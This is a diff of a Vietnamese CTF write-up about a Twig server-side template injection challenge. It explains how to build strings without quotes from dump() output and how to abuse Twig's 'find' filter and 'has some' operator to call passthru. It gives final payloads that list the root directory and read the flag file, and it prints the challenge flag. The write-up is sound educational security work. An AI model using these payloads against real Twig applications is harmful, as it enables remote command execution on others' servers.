@@ -10,7 +10,7 @@ Trong giải CyberSpace này thì team mình đã đạt thứ hạng khá cao l
 Khi merge lại để chơi chung thì điểm lợi sẽ là mình được trao đổi, học hỏi kiến thức của những teammates khác. Từ đó giảm thiểu việc mình lún quá sâu vào các rabbithole hoặc đi sai hướng. Nhưng nó đã hại mình khá nhiều vì tạo cho mình thói quen xem hướng của anh em trước, khiến việc spot vuln và hàm lỗi của mình trở nên rất kém. Điều này mình đã và đang cố gắng khắc phục, kết quả giải này cho thấy quá trình này vẫn còn rất dài khi mình vẫn chưa thể tự mình làm được 1 challenge nào một cách hẳn hoi.
 Mình viết lại write up này cũng chỉ chia sẻ lại góc nhìn của mình về challenge, cũng như những kiến thức mình học được vì mình ấn tượng nhất và thấy bài này khá hay. Thôi không dài dòng nữa, bắt đầu thôi!
 ## Preface
-![image](https://hackmd.io/_uploads/H1fDp8V2A.png)
+![image](https://hackmd.io/_uploads/H1fDp8V2A.png)<br>
 Đề bài rất straightforward, là một website để render Twig template online, thì mình cũng hiểu được là phải khai thác lỗi SSTI tại challenge này.
 ## Source Code Analysis
 ### Dockerfile
@@ -72,36 +72,36 @@ Sau khi teammate tìm ra được cách để nối chuỗi là sử dụng dump
 ## Bypass
 ### Craft String in Twig using {% set ... %}
 Với việc cấm tất cả dấu nháy, việc khai báo một string hay array cơ bản là không thể. Tuy nhiên ta có thể dụng dấu `~` để nối chuỗi các string với nhau hoặc các **biến** với nhau. Nên ý tưởng ban đầu là sử dump() -> var_dump ra context hiện tại, dùng slice để lấy từng ký tự trong chuỗi trả ra và nối chúng lại với nhau thành chuỗi.
-![image](https://hackmd.io/_uploads/HkN6MqVhC.png)
-![image](https://hackmd.io/_uploads/HyfaXq4hC.png)
+![image](https://hackmd.io/_uploads/HkN6MqVhC.png)<br>
+![image](https://hackmd.io/_uploads/HyfaXq4hC.png)<br>
 Với cách này ta có thể tạo thành string, tuy nhiên bị giới hạn về mặt từ ngữ, và việc ghép từng ký tự theo số như này rất mệt, nhất là việc flag có nhiều ký tự như kia mà ta không có ký tự * thì nối đến chết :skull: 
 Thay vì lấy từ dump, ta có thể sử dụng `{}` để một tham số thành mảng, nơi giá trị của tham số là value của nó:
-![image](https://hackmd.io/_uploads/SkOwrcE3A.png)
+![image](https://hackmd.io/_uploads/SkOwrcE3A.png)<br>
 Kết hợp nó với dump thì ta có:
-![image](https://hackmd.io/_uploads/rybTHqE2C.png)
+![image](https://hackmd.io/_uploads/rybTHqE2C.png)<br>
 Tên tham số sytem được đưa vào mảng, với giá trị tương ứng là giá trị của tham số sytem và = NULL -> slice mảng này sẽ dễ hơn slice từng kí tự một khi sử dụng `dump()`
 Vậy là ta có thể craft ra các ký tự rồi, nhưng flag nằm ở / và flag cũng chứa dấu - thì ta phải xử lý như thế nào. Khi `_context` không chứa dấu / và nếu ta cũng không thể đưa dấu `*` vào bên trong `dump({})` vì như thế sẽ lỗi ngay:
-![image](https://hackmd.io/_uploads/HJkUUcEnC.png)
+![image](https://hackmd.io/_uploads/HJkUUcEnC.png)<br>
 Vậy nhiệm vụ tiếp theo là cần dấu `/` và dấu `-` bằng cách tiếp tục sử dụng `dump()`
 Với dấu `-` thì trong `_charset` ta sẽ thấy có xuất hiện dấu đó nằm trong chuỗi `UTF-8`. Ta lấy ký tự thứ 4, tương ứng với slice(3,1) vì vị trí string bắt đầu đếm từ 0 để lấy dấu `-` ra:
 ```php!
 {% set hyphen = _charset|slice(3,1) %}
 ```
-![image](https://hackmd.io/_uploads/HksWD5V30.png)
+![image](https://hackmd.io/_uploads/HksWD5V30.png)<br>
 Còn dấu `/` thì ta có thể lấy ký tự xuống dòng (sẽ xuất hiện khi dump) sau đó thêm filter `nl2br` để chuyển ký tự xuống dòng thành thẻ HTML `<br/>`, tiếp tục sử dụng filter `raw` để giữ nguyên thẻ không bị html encode, rồi slice lấy dấu `/` bên trong thẻ br:
 ```php!
 {% set slash = dump()|slice(10,1)|nl2br|raw|slice(4,1) %}
 ```
 Ngoài cách sử dụng `{}`, ta cũng có thể sử dụng filter split chuỗi đầu vào với ký tự không tồn tại trong chuỗi để chuyển chuỗi thành mảng, vì công dụng của split là chia chuỗi thành mảng các phần tử theo ký tự xác định
-![image](https://hackmd.io/_uploads/S18kYqEnR.png)
+![image](https://hackmd.io/_uploads/S18kYqEnR.png)<br>
 ### Find Twig filters to RCE
 #### find
 Công cụ đã có đủ cả, giờ thứ mình và đồng đội đã stuck rất lâu mới tìm ra, đó là filters phù hợp để có thể RCE.
 Biết được phiên bản Twig đang sử dụng là 3.12, mình tìm kiếm nhưng kết quả no hope, cày hết cái doc các filters của Twig thì toàn cái không dùng được, những cái dùng được đều bị blacklist hết.
 Bí ngòi cả 1 ngày thì teammate tìm ra filter `find` có thể được sử dụng để RCE:
-![image](https://hackmd.io/_uploads/HJsPKcEh0.png)
+![image](https://hackmd.io/_uploads/HJsPKcEh0.png)<br>
 Về cách sử dụng thì y chang các filter đã bị blacklist, tự hỏi tại sao nó không ở trong doc thì có lẽ doc upadte chưa tới do filter này mới được thêm vào tại phiên bản 3.11:
-![image](https://hackmd.io/_uploads/BJWa55Vn0.png)
+<br>![image](https://hackmd.io/_uploads/BJWa55Vn0.png)<br>
 Filter này nằm tại file `/Twig/src/Extension/CoreExtension.php`, là một trong các filter có sẵn của Twig, đoạn code xử lý filter này sẽ như sau:
 ```php!
 public function getFilters(): array
@@ -142,7 +142,7 @@ system($command, 0)
 passthru($command, 0)
 ```
 Để test thì tạm thời mình comment lại đoạn check blacklist để run cho tiện:
-![image](https://hackmd.io/_uploads/SkB-05E3A.png)
+![image](https://hackmd.io/_uploads/SkB-05E3A.png)<br>
 #### has some
 Ngoài filter `find` ra, mình đi lượn github thì có người còn tìm được operator `has some` cũng có thể được sử dụng để RCE, với nguyên lý cũng tương tự `find`:
 ```php!
@@ -175,7 +175,7 @@ public static function arraySome(Environment $env, $array, $arrow)
 ```php!
 {{["id"] has some "passthru"}}
 ```
-![image](https://hackmd.io/_uploads/Sy4LksN2C.png)
+![image](https://hackmd.io/_uploads/Sy4LksN2C.png)<br>
 Cách này khá lỏd và có lẽ mình sẽ sử dụng trong một ctf challenge nào đó =)))
 ## Final Payload & Exploit
 Tổng hợp lại để khai thác, đầu tiên mình craft payload `ls /` để đọc flag trước đã, mình sử dụng passthru thay cho system vì đỡ phải nối chuỗi 3 phát=))
@@ -189,7 +189,7 @@ Tổng hợp lại để khai thác, đầu tiên mình craft payload `ls /` đ�
 {{ {cmd}|find(pass) }}
 ```
 Mình có được tên flag là: `flag-efbeeaddce`
-![image](https://hackmd.io/_uploads/rknefsE20.png)
+![image](https://hackmd.io/_uploads/rknefsE20.png)<br>
 Giờ thì craft câu lệnh đọc flag thôi:
 ```php!
 {% set cat = dump({cat})|slice(15,3) %}
@@ -201,8 +201,8 @@ Giờ thì craft câu lệnh đọc flag thôi:
 {% set cmd = cat~space~slash~flag %}
 {{ {cmd}|find(pass) }}
 ```
-![image](https://hackmd.io/_uploads/Sy-Tzi4h0.png)
+![image](https://hackmd.io/_uploads/Sy-Tzi4h0.png)<br>
 Trên server thì flag có tên: `flag-edbfcbcaef`
-![image](https://hackmd.io/_uploads/HyvNmsN2A.png)
-![image](https://hackmd.io/_uploads/SykPmoNnC.png)
+![image](https://hackmd.io/_uploads/HyvNmsN2A.png)<br>
+![image](https://hackmd.io/_uploads/SykPmoNnC.png)<br>
 - Flag: **CSCTF{Tw1g_tw1g_ssT1_n0_h4cKtr1ck5_th1S_t1M3}**
